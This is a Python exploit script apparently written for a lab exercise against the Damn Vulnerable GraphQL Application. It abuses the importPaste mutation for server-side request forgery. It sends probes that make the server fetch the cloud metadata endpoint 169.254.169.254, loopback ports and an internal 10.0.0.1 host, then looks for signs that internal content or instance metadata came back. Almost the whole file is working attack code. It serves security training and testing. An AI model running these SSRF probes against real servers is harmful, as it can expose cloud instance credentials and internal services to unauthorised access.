#!/usr/bin/env python3
"""
dvga_challenge_07_ssrf.py — Server-Side Request Forgery via importPaste(host:).

DVGA's `importPaste(scheme, host, port, path)` makes the server fetch an
arbitrary URL — a textbook SSRF sink. Pointing it at the cloud metadata
service (169.254.169.254), loopback, or internal hosts lets an attacker read
internal resources / instance credentials through the response.

RELIABLE signal: the mutation returns `result` echoing fetched content (or a
distinct error that proves the server attempted the fetch). We probe the
metadata endpoint and a couple of internal hosts and report what came back,
without dumping full credential material.
Run: python3 dvga_challenge_07_ssrf.py [--config ...]
"""
import argparse
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import dvga_common as dv


def find_config():
    if os.path.exists("dvga_config.yaml"):
        return "dvga_config.yaml"
    return os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "dvga_config.yaml")


def main():
    ap = argparse.ArgumentParser(description="SSRF via importPaste(host:)")
    ap.add_argument("--config", default=find_config())
    args = ap.parse_args()

    cfg = dv.load_config(args.config)
    base = dv.base_url(cfg)
    tout = dv.timeout(cfg)
    hdrs = dv.consumer_headers(807)

    # (scheme, host, port, path) — metadata + loopback + internal probes.
    probes = [
        ("http", "169.254.169.254", 80, "/latest/meta-data/"),
        ("http", "127.0.0.1", 5000, "/"),
        ("http", "localhost", 5000, "/graphql"),
        ("http", "10.0.0.1", 80, "/"),
    ]

    hits = 0
    for scheme, host, port, path in probes:
        q = (
            "mutation { importPaste(scheme: \"%s\", host: \"%s\", port: %d, path: \"%s\") { result } }"
            % (scheme, host, port, path)
        )
        r = dv.graphql(base, q, None, cfg, hdrs, tout)
        if r is None:
            print(f"importPaste({host}:{port}{path}) -> transport error")
            continue
        body = r.json() if r.headers.get("content-type", "").find("json") >= 0 else {}
        errs = body.get("errors") or []
        result = (((body.get("data") or {}).get("importPaste") or {}).get("result"))
        blob = (str(result) + " " + " ".join((e.get("message") or "") for e in errs)).lower()
        # Signals the server actually reached out / read something.
        signal = any(k in blob for k in (
            "ami-id", "instance-id", "public-keys", "meta-data",  # cloud metadata
            "connection refused", "could not", "failed to", "timed out",  # fetch attempted
            "<html", "http/", "graphql",  # an internal page was fetched
        ))
        if signal:
            hits += 1
        frag = (str(result) or " ".join((e.get("message") or "") for e in errs))[:160]
        print(f"importPaste({host}:{port}{path}) -> "
              f"{'[SIGNAL: server fetched/reflected internal target]' if signal else 'no SSRF signal'} | {frag!r}")

    print(f"\nDone — {hits}/{len(probes)} probe(s) produced an SSRF signal.")
    if hits:
        print("[FINDING] importPaste(host:) lets the server fetch arbitrary URLs (cloud metadata / internal) — SSRF.")
    else:
        print("[ok] no SSRF signal observed (importPaste may be restricted on this build).")


if __name__ == "__main__":
    main()
